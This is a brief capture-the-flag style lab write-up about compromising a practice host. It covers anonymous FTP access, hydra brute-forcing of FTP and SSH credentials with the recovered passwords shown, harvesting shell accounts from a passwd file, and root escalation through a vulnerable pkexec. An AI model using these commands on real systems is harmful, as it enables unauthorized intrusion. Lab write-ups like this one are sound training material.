#### Recap
The full scan found a service on TCP port 12380 that the default port set missed. Port 80 returned HTTP 404, and the initial checks on port 12380 were inconclusive.

The FTP scan showed that anonymous login was enabled.
```bash
ftp 192.168.200.148
```
A note on the FTP service exposed likely account names.
```txt
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
I assessed Elly and John for weak FTP credentials.
```bash
hydra -l elly -e nsr ftp://192.168.200.148 -V
# elly/ylle
```
A valid FTP login exposed a passwd file. I used it to identify accounts with interactive shells.
```bash
cat passwd | grep 'sh$' | awk -F: '{print $1}' 
```
I assessed the identified interactive accounts for weak SSH passwords.
```bash
hydra -L users.txt 192.168.200.148 -e srn ssh -V 
# [22][ssh] host: 192.168.200.148   login: SHayslett   password: SHayslett
```
A valid SSH credential yielded the initial shell and first flag.


The text files did not produce a useful local lead. SUID enumeration exposed vulnerable pkexec. The initial build did not match the host architecture, but the 32-bit build yielded root access.
